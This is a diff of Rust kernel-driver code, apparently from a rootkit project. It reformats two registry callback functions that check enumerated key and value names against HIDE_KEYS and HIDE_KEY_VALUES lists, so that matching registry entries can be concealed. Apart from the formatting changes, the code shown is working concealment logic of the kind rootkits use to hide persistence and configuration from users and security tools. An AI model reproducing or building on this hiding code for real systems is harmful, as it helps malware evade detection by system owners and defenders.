@@ -18,10 +18,12 @@ use {
 /// Checks if the key is present.
 ///
 /// # Parameters
+/// 
 /// - `info`: Pointer to the record operation information structure.
 /// - `key`: Name of the key to be checked.
 ///
 /// # Returns
+/// 
 /// - `bool`: Returns `true` if the key is found, otherwise `false`.
 ///
 pub unsafe fn check_key(info: *mut REG_POST_OPERATION_INFORMATION, key: String) -> bool {
@@ -29,10 +31,8 @@ pub unsafe fn check_key(info: *mut REG_POST_OPERATION_INFORMATION, key: String) 
     match (*info_class).KeyInformationClass {
         KeyBasicInformation => {
             let basic_information = (*info_class).KeyInformation as *mut KEY_BASIC_INFORMATION;
-            let name = from_raw_parts(
-                (*basic_information).Name.as_ptr(),
-                ((*basic_information).NameLength / size_of::<u16>() as u32) as usize,
-            );
+            let name = from_raw_parts((*basic_information).Name.as_ptr(), ((*basic_information).NameLength / size_of::<u16>() as u32) as usize);
+            
             let key = format!("{key}\\{}", String::from_utf16_lossy(name));
             if Registry::check_key(key.clone(), HIDE_KEYS.lock()) {
                 return true
@@ -40,10 +40,8 @@ pub unsafe fn check_key(info: *mut REG_POST_OPERATION_INFORMATION, key: String) 
         },
         KeyNameInformation => {
             let basic_information = (*info_class).KeyInformation as *mut KEY_NAME_INFORMATION;
-            let name = from_raw_parts(
-                (*basic_information).Name.as_ptr(),
-                ((*basic_information).NameLength / size_of::<u16>() as u32) as usize,
-            );
+            let name = from_raw_parts((*basic_information).Name.as_ptr(), ((*basic_information).NameLength / size_of::<u16>() as u32) as usize);
+
             let key = format!("{key}\\{}", String::from_utf16_lossy(name));
             if Registry::check_key(key.clone(), HIDE_KEYS.lock()) {
                 return true
@@ -69,10 +67,7 @@ pub unsafe fn check_key_value(info: *mut REG_POST_OPERATION_INFORMATION, key: St
     match (*info_class).KeyValueInformationClass {
         KeyValueBasicInformation => {    
             let value = (*info_class).KeyValueInformation as *const KEY_VALUE_BASIC_INFORMATION;   
-            let name = from_raw_parts(
-                (*value).Name.as_ptr(),
-                ((*value).NameLength / size_of::<u16>() as u32) as usize,
-            );
+            let name = from_raw_parts((*value).Name.as_ptr(), ((*value).NameLength / size_of::<u16>() as u32) as usize);
             let value =  String::from_utf16_lossy(name);
             if Registry::check_target(key.clone(), value.clone(), HIDE_KEY_VALUES.lock()) {
                 return true
@@ -80,10 +75,7 @@ pub unsafe fn check_key_value(info: *mut REG_POST_OPERATION_INFORMATION, key: St
         },
         KeyValueFullInformationAlign64 => {
             let value = (*info_class).KeyValueInformation as *const KEY_VALUE_FULL_INFORMATION;
-            let name = from_raw_parts(
-                (*value).Name.as_ptr(),
-                ((*value).NameLength / size_of::<u16>() as u32) as usize,
-            );
+            let name = from_raw_parts((*value).Name.as_ptr(), ((*value).NameLength / size_of::<u16>() as u32) as usize);
             
             let value =  String::from_utf16_lossy(name);
             if Registry::check_target(key.clone(), value.clone(), HIDE_KEY_VALUES.lock()) {
@@ -93,10 +85,7 @@ pub unsafe fn check_key_value(info: *mut REG_POST_OPERATION_INFORMATION, key: St
         },
         KeyValueFullInformation => {
             let value = (*info_class).KeyValueInformation as *const KEY_VALUE_FULL_INFORMATION;
-            let name = from_raw_parts(
-                (*value).Name.as_ptr(),
-                ((*value).NameLength / size_of::<u16>() as u32) as usize,
-            );
+            let name = from_raw_parts((*value).Name.as_ptr(), ((*value).NameLength / size_of::<u16>() as u32) as usize,);
             
             let value =  String::from_utf16_lossy(name);
             if Registry::check_target(key.clone(), value.clone(), HIDE_KEY_VALUES.lock()) {
